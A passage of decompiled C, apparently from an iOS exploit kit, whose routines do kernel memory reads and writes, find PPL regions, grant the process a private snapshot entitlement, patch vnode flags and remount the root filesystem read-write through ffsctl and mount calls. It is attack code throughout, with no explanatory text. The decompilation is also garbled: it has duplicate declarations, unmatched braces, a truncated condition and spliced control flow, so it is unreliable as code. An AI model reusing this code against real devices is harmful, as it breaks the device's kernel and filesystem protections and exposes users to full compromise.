    err = 0;
  }
  else {
    handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -8);
    if (handle == 0) {
      return;
    }
    handle = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
    if (handle == 0) {
      return;
    }
    err = (int)handle - (int)addr;
  }
  if (addr == 0) {
    return;
  }
  if (*(int *)(handle + 0x140) < 0x1c1b) {
    if (*(int *)(handle + 0x140) < 0x1809) {
      err = 0x90000;
    }
    else {
      err = 0x88000;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        err = 0x8c000;
      }
    }
  }
  *(long *)(&k_kernel_slot_1888 + handle) = addr;
  *(int *)(&k_kernel_slot_1890 + handle) = err;
fail:
  *addr_2 = addr;
  *flags = err;
  return;
}





uint64_t coruna_kernel6544_via_nop_stub_3_2(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  unsigned long u;
  long handle;
  unsigned long size;
  uint64_t version;
  unsigned long port;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  unsigned long bootargs;
  long thread_attr [2];
  char host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  unsigned long serial_buf;
  
  serial_buf = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  serial_buf = 0;
  host_info = 0;
  bootargs = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  version = coruna_nop_stub_3(val,size_3,&scratch);
  u = bootargs;
  if ((int)version == 0) {
    return version;
  }
  if (bootargs == '\x03') {
    version = coruna_nop_stub_3(val,id_2,thread_attr);
    size = serial_buf;
    handle = thread_attr[0];
    if ((int)version == 0) {
      return version;
    }
    if (host_info == '\x03') {
      u = serial_buf & 0x3fff | (u >> 0xe & 0x3ffffffff) << 0xe;
      port = serial_buf & 0xffff000000000000 | u;
      if (((int)u != (int)serial_buf) &&
         (version = coruna_return_zero_df2c(val,thread_attr[0],port), (int)version == 0)) {
        return version;
      }
      if ((size >> 0x20 != port >> 0x20) &&
         (version = coruna_return_zero_df2c(val,handle + 4,port >> 0x20), (int)version == 0)) {
        return version;
      }
      coruna_semaphore_timedwait(val,&k_kernel_slot_2710);
      return 1;
    }
  }
  return 0;
}





void coruna_kernel6544_via_return_zero_df2c(long handle,unsigned long arg,uint64_t val)
{
  void (*ptr)(void);
  int err;
  unsigned long unaff_x30;
  uint scratch;
  unsigned long bootargs;
  uint32_t thread_attr;
  
  thread_attr = (uint32_t)val;
  bootargs = 0;
  scratch = 0;
  err = coruna_ctx_test_flag(handle,0x5184001);
  if (err != 0) {
    if (0x1f52ffffffffff < *(unsigned long *)(handle + 0x158)) {
fail:
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      coruna_return_zero_df2c(handle,arg,val);
      return;
    }
    err = coruna_find_ppltext(handle,&bootargs,&scratch);
    if (err != 0) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
      ___stack_chk_fail();
      }
      coruna_return_zero_df2c(handle,arg,val);
      return;
    }
  }
  return;
}





unsigned long coruna_return_zero_df2c(long arg,uint64_t val,uint64_t n)

{
  int count;
  unsigned long type_id_14;
  
  count = coruna_ctx_test_flag(arg,0x5184000);
  if (count == 0) {
next:
    count = coruna_ctx_test_flag(arg,0x5100000);
    if (count != 0) {
      type_id_14 = *(unsigned long *)(arg + 0x158);
      {
        if (0x27120a807fffff < type_id_14) {
        return 0;
        }
      }
      if ((0x225c1e804fffff < type_id_14) && (*(int *)(arg + 0x140) < 0x2712)) goto found;
    }
    count = coruna_ctx_test_flag(arg,0x5184001);
    if ((count == 0) || (*(unsigned long *)(arg + 0x158) < 0x1f530000000000)) {
      type_id_14 = coruna_return_zero_1ef6c(arg,val,n);
      return type_id_14;
    }
    count = coruna_kernel6544_via_ctx_test_flag_3(arg,val,n);
  }
  else {
    type_id_14 = *(unsigned long *)(arg + 0x158);
    if (type_id_14 < 0x2712000c700000) {
      if ((type_id_14 < 0x225c2380100000) || (0x2711 < *(int *)(arg + 0x140))) goto next;
    }
    else {
retry:
      if (0x27120a807fffff < type_id_14) {
        return 0;
      }
    }
found:
    count = coruna_kernel6544_via_nop_stub_3(arg,val,n);
  }
  return (unsigned long)(count == 0);
}





uint64_t coruna_vm_deallocate_f7f8(long handle,long addr_2,long off_3,uint size)
{
  long handle;
  uint u;
  uint8_t *ptr;
  kern_return_t lk4;
  int err;
  uint64_t size;
  unsigned long version;
  uint port;
  void *scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  lk4 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t *)&scratch,
                       (unsigned long)*(uint *)(handle + 0x180),1);
  if (lk4 == 0) {
    size = coruna_kernel6544_via_return_zero_30a2c(handle,addr_2);
    port = 0;
    do {
      handle = addr_2 + (unsigned long)port;
      u = *(int *)(handle + 0x180) - ((uint)handle & *(uint *)(handle + 0x188));
      if (size - port <= u) {
        u = size - port;
      }
      version = (unsigned long)u;
      err = coruna_nop_stub_6(handle,handle,version,scratch);
      if (err == 0) {
fail:
        size = 0;
        goto done;
      }
      err = _memcmp(scratch,(void *)(off_3 + (unsigned long)port),version);
      if ((err != 0) &&
         (err = coruna_return_zero_e210(handle,handle,(void *)(off_3 + (unsigned long)port),version,size,0),
         err == 0)) goto fail;
      port = u + port;
    } while (port != size);
    size = 1;
done:
    _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)scratch,(unsigned long)*(uint *)(handle + 0x180));
  }
  else {
    size = 0;
  }
  return size;
}





uint64_t coruna_kernel6544_via_return_zero_30a2c(long handle,unsigned long arg)
{
  long handle;
  uint64_t u;
  
  handle = coruna_return_zero_30a2c(handle,arg,0,arg);
  if ((handle == 0) &&
     (((handle = *(long *)(&k_kernel_slot_19f8 + handle), handle == 0 ||
       (arg < *(unsigned long *)(handle + 0xe0))) ||
      (*(long *)(handle + 0xe8) + *(unsigned long *)(handle + 0xe0) <= arg)))) {
    u = 0;
  }
  else {
    u = 1;
  }
  return u;
}





unsigned long coruna_return_zero_e210(long arg,unsigned long val,long n,unsigned long m,unsigned long p,
                  uint64_t q)

{
  void (*ptr)(void);
  int flags;
  unsigned long u;
  unsigned long unaff_x30;
  uint64_t cache_21[2];
  byte cache_22;
  uint work;
  
  if (val == 0) {
    return 0;
  }
  if (n == 0) {
    return 0;
  }
  if ((int)m == 0) {
    return 0;
  }
  u = val & (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff);
  if (u == ((val + (m & 0xffffffff)) - 1 &
               (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff))) {
    if ((p & 1) != 0) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
        u = coruna_kernel6544_via_slot_clear(arg,val,n,m,q);
        return u;
      }
    ___stack_chk_fail();
}
    u = coruna_nop_stub_3(arg,u,cache_21);
    if ((int)u == 0) {
      return u;
    }
    if ((cache_22 | 2) == 3) {
      if ((work >> 7 & 1) != 0) {
        u = coruna_kernel6544_via_return_zero_df2c(arg,cache_21[0],work & 0xffffff7f);
        if ((int)u == 0) {
          return u;
        }
        coruna_semaphore_timedwait(arg,&k_kernel_slot_2710);
      }
      flags = coruna_memcpy_e3d0(arg,val,n,m,q);
      return (unsigned long)(flags != 0);
    }
  }
  return 0;
}





uint64_t coruna_kernel6544_via_kernel6544_via_return_zero_30a2c(long handle,uint64_t val,long addr_2)
{
  uint64_t u;
  long scratch;
  long bootargs;
  
  bootargs = addr_2;
  u = coruna_ctx_test_flag(handle,0x5184001);
  if (((int)u != 0) && (u = coruna_kernel6544_residual_256(handle,val,&scratch), (int)u != 0)) {
    if (scratch != addr_2) {
      u = coruna_kernel6544_via_return_zero_30a2c(handle,val);
      u = coruna_return_zero_e210(handle,val,&bootargs,*(uint32_t *)(handle + 0x168),u,1);
      if ((int)u == 0) {
        return u;
      }
    }
    u = 1;
  }
  return u;
}





uint64_t coruna_memcpy_e3d0(long handle,uint64_t val,uint64_t id_2,int flags,int count_2)
{
  int err;
  uint64_t u;
  uint64_t scratch;
  
  if ((count_2 == 0) || (*(int *)(handle + 0x168) != flags)) {
    u = coruna_nop_stub_7(handle,val);
    err = (int)u;
  }
  else {
    scratch = 0;
    ___memcpy_chk(&scratch,id_2,flags,8);
    u = coruna_call_mach_vm_machine_attribute_29df8(handle,val,scratch);
    err = (int)u;
  }
  if (err != 0) {
    u = 1;
  }
  return u;
}





void coruna_msu_statfs_probe(uint64_t val,uint *size)
{
  char *ptr;
  int err;
  int *err;
  uint64_t u;
  uint size;
  char scratch [10];
  char scratch [8];
  char bootargs [8];
  char thread_attr [7];
  char bootargs;
  char host_info [16];
  statfs thread_attr;
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(&thread_attr,0x878);
  scratch[0] = '/';
  scratch[1] = '\0';
  scratch[0] = s__private_var_MobileSoftwareUpdat_0003a45f[8];
  scratch[1] = s__private_var_MobileSoftwareUpdat_0003a45f[9];
  scratch[2] = s__private_var_MobileSoftwareUpdat_0003a45f[10];
  scratch[3] = s__private_var_MobileSoftwareUpdat_0003a45f[0xb];
  scratch[4] = s__private_var_MobileSoftwareUpdat_0003a45f[0xc];
  scratch[5] = s__private_var_MobileSoftwareUpdat_0003a45f[0xd];
  scratch[6] = s__private_var_MobileSoftwareUpdat_0003a45f[0xe];
  scratch[7] = s__private_var_MobileSoftwareUpdat_0003a45f[0xf];
  scratch[2] = s__private_var_MobileSoftwareUpdat_0003a45f[0];
  scratch[3] = s__private_var_MobileSoftwareUpdat_0003a45f[1];
  scratch[4] = s__private_var_MobileSoftwareUpdat_0003a45f[2];
  scratch[5] = s__private_var_MobileSoftwareUpdat_0003a45f[3];
  scratch[6] = s__private_var_MobileSoftwareUpdat_0003a45f[4];
  scratch[7] = s__private_var_MobileSoftwareUpdat_0003a45f[5];
  scratch[8] = s__private_var_MobileSoftwareUpdat_0003a45f[6];
  scratch[9] = s__private_var_MobileSoftwareUpdat_0003a45f[7];
  thread_attr[0] = s__private_var_MobileSoftwareUpdat_0003a45f[0x18];
  thread_attr[1] = s__private_var_MobileSoftwareUpdat_0003a45f[0x19];
  thread_attr[2] = s__private_var_MobileSoftwareUpdat_0003a45f[0x1a];
  thread_attr[3] = s__private_var_MobileSoftwareUpdat_0003a45f[0x1b];
  thread_attr[4] = s__private_var_MobileSoftwareUpdat_0003a45f[0x1c];
  thread_attr[5] = s__private_var_MobileSoftwareUpdat_0003a45f[0x1d];
  thread_attr[6] = s__private_var_MobileSoftwareUpdat_0003a45f[0x1e];
  bootargs[0] = s__private_var_MobileSoftwareUpdat_0003a45f[0x10];
  bootargs[1] = s__private_var_MobileSoftwareUpdat_0003a45f[0x11];
  bootargs[2] = s__private_var_MobileSoftwareUpdat_0003a45f[0x12];
  bootargs[3] = s__private_var_MobileSoftwareUpdat_0003a45f[0x13];
  bootargs[4] = s__private_var_MobileSoftwareUpdat_0003a45f[0x14];
  bootargs[5] = s__private_var_MobileSoftwareUpdat_0003a45f[0x15];
  bootargs[6] = s__private_var_MobileSoftwareUpdat_0003a45f[0x16];
  bootargs[7] = s__private_var_MobileSoftwareUpdat_0003a45f[0x17];
  bootargs = s__private_var_MobileSoftwareUpdat_0003a45f[0x1f];
  host_info[0] = s__private_var_MobileSoftwareUpdat_0003a45f[0x20];
  host_info[1] = s__private_var_MobileSoftwareUpdat_0003a45f[0x21];
  host_info[2] = s__private_var_MobileSoftwareUpdat_0003a45f[0x22];
  host_info[3] = s__private_var_MobileSoftwareUpdat_0003a45f[0x23];
  host_info[4] = s__private_var_MobileSoftwareUpdat_0003a45f[0x24];
  host_info[5] = s__private_var_MobileSoftwareUpdat_0003a45f[0x25];
  host_info[6] = s__private_var_MobileSoftwareUpdat_0003a45f[0x26];
  err = coruna_statfs_1881c(0);
  ptr = scratch + 2;
  if (err == 0) {
    ptr = scratch;
  }
  err = _statfs(ptr,&thread_attr);
  if (err == 0) {
    if ((coruna_cat(thread_attr.f_mntfromname[7],thread_attr.f_mntfromname) != 0x7369642f7665642f
         || coruna_u64_pack71((thread_attr.f_mntfromname), (thread_attr.f_mntfromname[7])) != 0x31733173306b73
        size = 3;
        }
        *size = size;
        u = 1;
        done:
        if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
        return;
  }
  else {
    err = ___error();
    if (*err != 2) {
      u = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
      return;
      }
      ___stack_chk_fail(u);
    }
fail:
    size = 3;
  }
  *size = size;
  u = 1;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail(u);
}





bool coruna_kernel6544_via_ptr_canonicalize_3(long handle,char *path)
{
  bool err;
  int err;
  int status;
  long handle;
  uint scratch;
  long bootargs;
  
  scratch = 0;
  err = *(int *)(handle + 0x140);
  if (err - 0x1f53U < 2) {
    handle = 0x260;
  }
  else if (err == 0x1809) {
    handle = 0x208;
  }
  else {
    if (err != 0x1c1b) {
      return false;
    }
    handle = 0x200;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      handle = 0x218;
    }
  }
  err = _open(path,0x100000);
  if (err < 0) {
    err = false;
  }
  else {
    bootargs = coruna_return_zero_e6fc(handle,err);
    if ((((bootargs == 0) || (status = coruna_kernel6544_residual_256(handle,bootargs + handle,&bootargs), status == 0))
        || (handle = coruna_ptr_canonicalize(handle,bootargs), handle == 0)) ||
       (((status = coruna_kernel6544_residual_256(handle,bootargs + 0xe0,&bootargs), status == 0 ||
         (handle = coruna_ptr_canonicalize(handle,bootargs), handle == 0)) ||
        (status = coruna_nop_stub_6(handle,bootargs + 0x30,4,&scratch), status == 0)))) {
      err = false;
    }
    else {
      scratch = scratch & 0xffffbfff;
      status = coruna_nop_stub_7(handle,bootargs + 0x30,&scratch,4);
      err = status != 0;
    }
    _close(err);
  }
  return err;
}





long coruna_return_zero_e6fc(long handle)
{
  int err;
  long handle;
  long scratch;
  
  err = *(int *)(handle + 0x140);
  if ((err - 0x1f53U < 2 || err == 0x1c1b) || err == 0x1809) {
    scratch = coruna_fileport_makeport();
    if (scratch == 0) {
      return 0;
    }
    scratch = scratch + 0x8f8;
    err = coruna_kernel6544_residual_256(handle,scratch,&scratch);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(handle,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





void coruna_root_dev_disk(uint64_t val)
{
  bool err;
  int err;
  uint64_t u;
  uint size;
  char scratch [2];
  statfs bootargs;
  char thread_attr [8];
  char scratch [8];
  char bootargs [8];
  char thread_attr [7];
  char host_info;
  char host_info [8];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0] = '/';
  scratch[1] = '\0';
  scratch = (char  [8])0;
  thread_attr = (char  [8])0;
  thread_attr = (char  [7])0;
  bootargs = (char  [8])0;
  host_info = s__private_var_MobileSoftwareUpdat_0003a45f[0x1f];
  host_info._0_7_ = 0;
  _bzero(&bootargs,0x878);
  err = _statfs(scratch,&bootargs);
  if (err == 0) {
    u = coruna_statfs(val,scratch,"/dev/disk0s1s1");
    if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
    }
    ___stack_chk_fail(u);
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_statfs(uint64_t val,uint *size)
{
  char *ptr;
  int err;
  int *err;
  uint64_t u;
  uint size;
  char scratch [10];
  char scratch [8];
  char bootargs [8];
  char thread_attr [7];
  char bootargs;
  char host_info [16];
  statfs thread_attr;
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(&thread_attr,0x878);
  scratch[0] = '/';
  scratch[1] = '\0';
  scratch[0] = s__private_var_MobileSoftwareUpdat_0002afd0[8];
  scratch[1] = s__private_var_MobileSoftwareUpdat_0002afd0[9];
  scratch[2] = s__private_var_MobileSoftwareUpdat_0002afd0[10];
  scratch[3] = s__private_var_MobileSoftwareUpdat_0002afd0[0xb];
  scratch[4] = s__private_var_MobileSoftwareUpdat_0002afd0[0xc];
  scratch[5] = s__private_var_MobileSoftwareUpdat_0002afd0[0xd];
  scratch[6] = s__private_var_MobileSoftwareUpdat_0002afd0[0xe];
  scratch[7] = s__private_var_MobileSoftwareUpdat_0002afd0[0xf];
  scratch[2] = s__private_var_MobileSoftwareUpdat_0002afd0[0];
  scratch[3] = s__private_var_MobileSoftwareUpdat_0002afd0[1];
  scratch[4] = s__private_var_MobileSoftwareUpdat_0002afd0[2];
  scratch[5] = s__private_var_MobileSoftwareUpdat_0002afd0[3];
  scratch[6] = s__private_var_MobileSoftwareUpdat_0002afd0[4];
  scratch[7] = s__private_var_MobileSoftwareUpdat_0002afd0[5];
  scratch[8] = s__private_var_MobileSoftwareUpdat_0002afd0[6];
  scratch[9] = s__private_var_MobileSoftwareUpdat_0002afd0[7];
  thread_attr[0] = s__private_var_MobileSoftwareUpdat_0002afd0[0x18];
  thread_attr[1] = s__private_var_MobileSoftwareUpdat_0002afd0[0x19];
  thread_attr[2] = s__private_var_MobileSoftwareUpdat_0002afd0[0x1a];
  thread_attr[3] = s__private_var_MobileSoftwareUpdat_0002afd0[0x1b];
  thread_attr[4] = s__private_var_MobileSoftwareUpdat_0002afd0[0x1c];
  thread_attr[5] = s__private_var_MobileSoftwareUpdat_0002afd0[0x1d];
  thread_attr[6] = s__private_var_MobileSoftwareUpdat_0002afd0[0x1e];
  bootargs[0] = s__private_var_MobileSoftwareUpdat_0002afd0[0x10];
  bootargs[1] = s__private_var_MobileSoftwareUpdat_0002afd0[0x11];
  bootargs[2] = s__private_var_MobileSoftwareUpdat_0002afd0[0x12];
  bootargs[3] = s__private_var_MobileSoftwareUpdat_0002afd0[0x13];
  bootargs[4] = s__private_var_MobileSoftwareUpdat_0002afd0[0x14];
  bootargs[5] = s__private_var_MobileSoftwareUpdat_0002afd0[0x15];
  bootargs[6] = s__private_var_MobileSoftwareUpdat_0002afd0[0x16];
  bootargs[7] = s__private_var_MobileSoftwareUpdat_0002afd0[0x17];
  bootargs = s__private_var_MobileSoftwareUpdat_0002afd0[0x1f];
  host_info[0] = s__private_var_MobileSoftwareUpdat_0002afd0[0x20];
  host_info[1] = s__private_var_MobileSoftwareUpdat_0002afd0[0x21];
  host_info[2] = s__private_var_MobileSoftwareUpdat_0002afd0[0x22];
  host_info[3] = s__private_var_MobileSoftwareUpdat_0002afd0[0x23];
  host_info[4] = s__private_var_MobileSoftwareUpdat_0002afd0[0x24];
  host_info[5] = s__private_var_MobileSoftwareUpdat_0002afd0[0x25];
  host_info[6] = s__private_var_MobileSoftwareUpdat_0002afd0[0x26];
  err = coruna_statfs_19324(0);
  ptr = scratch + 2;
  if (err == 0) {
    ptr = scratch;
  }
  err = _statfs(ptr,&thread_attr);
  if (err == 0) {
    if ((coruna_cat(thread_attr.f_mntfromname[7],thread_attr.f_mntfromname) != 0x7369642f7665642f
         || coruna_u64_pack71((thread_attr.f_mntfromname), (thread_attr.f_mntfromname[7])) != 0x31733173306b73
        size = 3;
        }
        *size = size;
        u = 1;
        done:
        if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
        return;
  }
  else {
    err = ___error();
    if (*err != 2) {
      u = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
      return;
      }
      ___stack_chk_fail(u);
    }
fail:
    size = 3;
  }
  *size = size;
  u = 1;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_statfs_10158(char *path)
{
  bool err;
  int err;
  statfs scratch;
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(&scratch,0x878);
  err = _statfs(path,&scratch);
  if (err == 0) {
    if (coruna_cat(scratch.f_mntfromname[7],scratch.f_mntfromname) == 0x7369642f7665642f
        && coruna_u64_pack71((scratch.f_mntfromname), (scratch.f_mntfromname[7])) == 0x31733173306b73)
    {
      err = _strcmp(path,scratch.f_mntonname);
      err = err == 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(err);
    }
  }
  else {
    ___error();
  }
  err = false;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(err);
}





int * coruna_chown_rmdir(long handle,int flags)
{
  uint8_t *ptr;
  bool err;
  int err;
  uint u;
  int status;
  int *err;
  unsigned long size;
  char *ptr;
  char *buf;
  uint64_t version;
  int *status;
  int flags;
  char scratch [3];
  char bootargs;
  statfs *thread_attr;
  char host_info [8];
  char scratch [8];
  char bootargs [8];
  char thread_attr [7];
  char serial_buf;
  char host_info [8];
  char *action;
  char *block_ctx;
  char *stack_guard;
  char *sa_saved;
  char *sa_new;
  uint64_t scratch;
  long path_buf;
  
  path_buf = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs = '\0';
  scratch = (char  [8])0;
  host_info = (char  [8])0;
  thread_attr = (char  [7])0;
  bootargs = (char  [8])0;
  serial_buf = s__private_var_MobileSoftwareUpdat_0003a45f[0x1f];
  host_info._0_7_ = 0;
  scratch[0] = '/';
  scratch[1] = '\0';
  coruna_ctx_set_flag(handle,0x400);
  ptr = k_kernel_mach_task_self_slot;
  err = (int *)coruna_kernel6544_via_return_zero_2b0c0(handle,*(uint32_t *)k_kernel_mach_task_self_slot,
                               "<dict><key>com.apple.private.vfs.snapshot</key><true/></dict>",0,8);
  if ((((int)err == 0) || (err = (int *)coruna_call_getattrlistbulk_39278(), (int)err == 0)) ||
     ((err = coruna_statfs_1881c(scratch + 3), err != 0 &&
      ((bootargs == '\0' && (err = (int *)coruna_root_dev_disk(handle), (int)err == 0))))))
  status = (int *)0x0;
  if (*(long *)k_kernel_stack_chk_guard_slot != path_buf) {
  ___stack_chk_fail(err);
  }
  return status;
}





uint64_t coruna_root_dev_disk_ee3c(uint64_t val,uint64_t id_2)
{
  int err;
  uint64_t u;
  uint32_t scratch;
  
  scratch = 0;
  u = coruna_return_zero_10aac(val,id_2,1,&scratch);
  if ((int)u != 0) {
    err = coruna_mount_apfs("/dev/disk0s1s1",id_2,0x110001);
    if (err == 0) {
      u = 1;
    }
    else {
      coruna_return_zero_10aac(val,id_2,scratch,0);
      u = 0;
    }
  }
  return u;
}





bool coruna_ffsctl_root(long handle,uint size)
{
  bool err;
  uint u;
  int err;
  int status;
  long handle;
  uint64_t size;
  char *ptr;
  unsigned long version;
  unsigned long port;
  uint scratch;
  uint32_t bootargs;
  statfs *thread_attr;
  
  thread_attr = (statfs *)0x0;
  u = _getmntinfo(&thread_attr,0);
  if (u == 0) {
    version = 1;
  }
  else {
    port = (unsigned long)u;
    ptr = thread_attr->f_mntonname;
    version = 1;
    do {
      err = _strcmp("/",ptr);
      if (err == 0) {
        version = (unsigned long)((byte)*(uint32_t *)(ptr + -0x18) & 1);
      }
      ptr = ptr + 0x878;
      port = port - 1;
    } while (port != 0);
  }
  u = coruna_root_is_apfs();
  bootargs = 0;
  if ((~(uint)version & 1) == size) {
    return true;
  }
  if (size == 0) {
    if ((u != 0) && (err = coruna_return_zero_10aac(handle,"/",1,&bootargs), err == 0)) {
      return false;
    }
    size = 0x10010001;
    err = -1;
  }
  else {
    err = _open("/",0);
    if (err == -1) {
      return false;
    }
    status = *(int *)(handle + 0x140);
    if (((1 < status - 0x1f53U) && (status != 0x1c1b)) && (status != 0x1809)) {
      return false;
    }
    handle = coruna_fileport_makeport(handle,err);
    if (handle == 0) {
      return false;
    }
    version = handle + 0x70;
    if (version == 0) {
      return false;
    }
    status = coruna_kernel6544_via_fcntl_1bf84(handle,version,&scratch);
    if (status == 0) {
      return false;
    }
    scratch = scratch & 0xffffbfff;
    status = coruna_mach_vm_machine_attribute(handle,version);
    if (status == 0) {
      return false;
    }
    status = _open("/",0);
    if (-1 < status) {
      thread_attr = (statfs *)((unsigned long)thread_attr & 0xffffffff00000000);
      _ffsctl(status,0x80046814,&thread_attr,0);
      thread_attr = 1;
      _ffsctl(status,0x80046815,&thread_attr,0);
      thread_attr = (statfs *)coruna_u64_pack((thread_attr), (2));
      if (u != 0) {
        _ffsctl(status,0x80044a11,&thread_attr,0);
        thread_attr = (statfs *)coruna_u64_pack((thread_attr), (3));
      }
      _ffsctl(status,0x80046816,&thread_attr,0);
      _close(status);
    }
    size = 0x10000;
  }
  if (u == 0) {
    status = coruna_mount_hfs("/dev/disk0s1s1","/",size);
  }
  else {
    status = coruna_mount_apfs();
  }
  err = status != -1;
  if (size == 0) {
    if (err || ((u ^ 1) & 1) != 0) {
      return err;
    }
    err = coruna_return_zero_10aac(handle,"/",bootargs,0);
    if (err != 0) {
      return err;
    }
  }
  else {
    status = coruna_kernel6544_via_fcntl_1bf84(handle,version,&scratch);
    if (status != 0) {
      scratch = scratch | 0x4000;
      status = coruna_mach_vm_machine_attribute(handle,version);
      if (status != 0) {
        _close(err);
        return err;
      }
    }
  }
  return false;
}





uint64_t coruna_msu_mnt1_path(uint64_t val,void *ctx,uint *size,int *flags)
{
  int err;
  int status;
  size_t ls3;
  uint64_t u;
  char *ptr;
  unsigned long size;
  
  err = coruna_statfs_1881c(0);
  if (err == 0) {
    ptr = "/";
fail:
    ls3 = _strlen(ptr);
    size = ls3 + 1;
    if (*size < size) {
      u = 0;
      if (flags != (int *)0x0) {
      *flags = err;
      }
      return u;
    }
    _memcpy(ctx,ptr,size);
  }
  else {
    status = coruna_statfs_10158("/private/var/MobileSoftwareUpdate/mnt1");
    if (status != 0) {
      ptr = "/private/var/MobileSoftwareUpdate/mnt1/";
      {
        ls3 = _strlen(ptr);
        size = ls3 + 1;
        if (*size < size) {
        u = 0;
        if (flags != (int *)0x0) {
        *flags = err;
        }
        return u;
        }
        _memcpy(ctx,ptr,size);
      }
    }
    size = 0;
  }
  *size = (uint)size;
  u = 1;
joined_r0x0000f1f8:
  if (flags != (int *)0x0) {
    *flags = err;
  }
  return u;
}





void coruna_fileport_makeport(void)
{
  _fileport_makeport();
  return;
}





uint64_t coruna_return_zero_10aac(long handle,char *path,uint64_t val,uint *size)
{
  int err;
  int status;
  long handle;
  long addr;
  uint64_t u;
  uint scratch;
  
  err = _open(path,0);
  if (err == -1) {
    return 0;
  }
  handle = coruna_return_zero_e6fc(handle,err);
  if (handle != 0) {
    status = *(int *)(handle + 0x140);
    if (status - 0x1f53U < 2) {
      addr = 0x224;
    }
    else if (status == 0x1809) {
      addr = 0x1c8;
    }
    else {
      u = 0;
      _close(err);
      return u;
    }
    status = coruna_kernel6544_via_fcntl_1bf84(handle,addr + handle,&scratch);
    u = 0;
    _close(err);
    return u;
  }
fail:
  u = 0;
done:
  _close(err);
  return u;
}





void coruna_mount_apfs(uint64_t val,char *path,uint size)
{
  int err;
  uint64_t scratch;
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t serial_buf;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t action;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t block_ctx;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t stack_guard;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t sa_saved;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t sa_new;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t path_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  cache_24 = 0;
  sa_new = 0;
  cache_26 = 0;
  cache_25 = 0;
  cache_21 = 0;
  sa_saved = 0;
  cache_23 = 0;
  cache_22 = 0;
  work = 0;
  stack_guard = 0;
  cache_20 = 0;
  cache = 0;
  url_buf = 0;
  block_ctx = 0;
  frame = 0;
  json_buf = 0;
  tmp_buf = 0;
  action = 0;
  plist = 0;
  region = 0;
  sa_saved = 0;
  serial_buf = 0;
  path_buf = 0;
  sa_new = 0;
  action = 0;
  host_info = 0;
  stack_guard = 0;
  block_ctx = 0;
  thread_attr = 0;
  thread_attr = 0;
  serial_buf = 0;
  host_info = 0;
  bootargs = 0;
  bootargs = 0;
  scratch = (unsigned long)size;
  path_buf = 0;
  scratch = val;
  err = _mount("apfs",path,size,&scratch);
  if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
    return;
  }
  ___stack_chk_fail(err);
}





int coruna_mount_hfs(uint64_t val,char *path,int flags)
{
  int err;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  bootargs = 0;
  scratch = val;
  err = _mount("hfs",path,flags,&scratch);
  return err;
}





bool coruna_root_is_apfs(void)
{
  bool err;
  uint u;
  int err;
  char *ptr;
  unsigned long size;
  statfs *scratch;
  
  scratch = (statfs *)0x0;
  u = _getmntinfo(&scratch,0);
  err = false;
  if (u != 0) {
    size = (unsigned long)u;
    ptr = scratch->f_mntonname;
    do {
      err = _strcmp("/",ptr);
      if (err == 0) {
        err = _strncmp("apfs",ptr + -0x10,0x10);
        err = err == 0;
      }
      ptr = ptr + 0x878;
